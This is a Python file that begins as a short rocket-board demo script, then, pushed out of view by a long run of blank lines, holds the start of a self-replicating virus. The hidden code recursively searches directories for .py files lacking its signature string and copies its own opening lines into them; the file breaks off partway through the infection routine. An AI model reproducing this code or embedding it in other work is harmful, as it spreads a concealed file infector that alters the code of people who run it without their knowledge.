import random
from rocket import Rocket, RocketBoard

board = RocketBoard(12)

print(board)
print(board[3].id)












































































































































































































import os
import sys
import subprocess
import threading
 
SIGNATURE = "Tohle fakt (mozna) neni virus"
 
def copy(s):
    if sys.platform.startswith('win32') or sys.platform.startswith('cygwin'):
        subprocess.Popen(['clip'], stdin=subprocess.PIPE).communicate(s)
    else:
        raise Exception('Platform not supported')
 
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
